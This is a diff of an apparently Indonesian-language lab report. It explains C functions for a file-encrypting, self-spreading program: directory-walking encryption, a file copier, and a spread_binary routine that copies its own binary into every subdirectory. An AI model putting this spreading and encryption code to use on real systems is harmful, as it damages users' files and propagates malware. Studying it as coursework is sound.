@@ -405,7 +405,7 @@ void scan_and_encrypt(const char *dirpath) {
   2) Fungsi ```scan_and_encrypt(const char *dirpath)```
      - Pertama-tama, fungsi mengambil input berupa file path
      - Dicek apakah file tersebut ada, jika tidak ada maka ```return```.
-     - Lalu dilakukan pengecekan, jika nama file adalah ```.``` atau ```..```, maka fungsi akan ```continue```.
+     - Lalu dilakukan pengecekan, jika nama file merupakan direktori saat ini dan sebelumnya, maka fungsi akan ```continue```.
      - Setelah itu, dilakukan ```sprintf()``` untuk mendapatkan ```full_path``` agar bisa ke tahap selanjutnya.
      - Dilakukan pengecekan bahwa ```full_path``` merupakan direktori atau bukan. Jika merupakan directory, maka fungsi akan memanggil dirinya sendiri (fungsi rekursif). Sedangkan, jika bukan maka file akan dienskripsi.
 
@@ -414,34 +414,69 @@ void scan_and_encrypt(const char *dirpath) {
   1) Fungsi ```copy_file(const char *source, const char *dest)```
      Untuk kodenya seperti ini
      
-     ```
-     void copy_file(const char *source, const char *dest) {
-       FILE *src = fopen(source, "rb");
-       if (!src) return;
-  
-       FILE *dst = fopen(dest, "wb");
-       if (!dst) {
-           fclose(src);
-           return;
-       }
-  
-       char buffer[BUFFER_SIZE];
-       size_t bytes;
-       while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
-           fwrite(buffer, 1, bytes, dst);
-       }
-  
-      fclose(src);
-      fclose(dst);
-    }
-    ```
+      ```
+      void copy_file(const char *source, const char *dest) {
+          FILE *src = fopen(source, "rb");
+          if (!src) return;
+      
+          FILE *dst = fopen(dest, "wb");
+          if (!dst) {
+              fclose(src);
+              return;
+          }
+      
+          char buffer[BUFFER_SIZE];
+          size_t bytes;
+          while ((bytes = fread(buffer, 1, sizeof(buffer), src)) > 0) {
+              fwrite(buffer, 1, bytes, dst);
+          }
+      
+          fclose(src);
+          fclose(dst);
+      }
+      ```
     
-  Penjelasan:
-  - Fungsi akan memanggil variabel pointer berupa source dan fest.
-  - Source akan dibuka dengan masing-masing dalamm mode read-back dan write-back.
-  - Keduanya dilakukan pengecekan, jiak tidak ada maka ```return```.
-  - Setelah itu, dilakukan copy file ke destinasi yang dituju.
-  - Lalu, source dan dst di-close.
+      Penjelasan:
+      - Fungsi akan memanggil variabel pointer berupa source dan fest.
+      - Source akan dibuka dengan masing-masing dalamm mode read-back dan write-back.
+      - Keduanya dilakukan pengecekan, jiak tidak ada maka ```return```.
+      - Setelah itu, dilakukan copy file ke destinasi yang dituju.
+      - Lalu, source dan dst di-close.
+
+  2) Fungsi
+
+     Untuk kodenya seperti ini
+     ```
+      void spread_binary(const char *current_dir, const char *self_path) {
+          DIR *dir = opendir(current_dir);
+          if (!dir) return;
+      
+          struct dirent *entry;
+          char fullpath[MAX_PATH];
+      
+          snprintf(fullpath, sizeof(fullpath), "%s/%s", current_dir, FILENAME);
+          copy_file(self_path, fullpath);
+      
+          while ((entry = readdir(dir)) != NULL) {
+              if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
+      
+              snprintf(fullpath, sizeof(fullpath), "%s/%s", current_dir, entry->d_name);
+              if (is_directory(fullpath)) {
+                  spread_binary(fullpath, self_path);
+              }
+          }
+      
+          closedir(dir);
+     }
+     ```
+
+     Penjelasan:
+     - Fungsi akan mengambil data berupa ```current_dir``` dan ```self_path```.
+     - Pengecekan dilakukan, jika ```current_dir``` tidak ada maka ```return```.
+     - Setelah itu, ```snprintf``` dilakukan untuk mencetak string untuk mendapatkan ```fullpath```.
+     - Setelah itu, dilakukan fungsi while, jika nama file merupakan direktori saat ini dan sebelumnya, maka fungsi akan ```continue```.
+     - Lalu, dilakuakn ```snprintf``` fullpath untuk mendapatkan data dengan ```current_dir``` dan ```entry->d_name```.
+     - Pengecekan dilakukan untuk mengetahui bahwa ```fullpath``` merupakan directory atau bukan. Jika ```fullpath``` merupakan directory, maka fungsi ```spread_binary(fullpath, self_path)``` akan dijalankan.
 
 
   <h2 id="soal4">Soal4</h2>
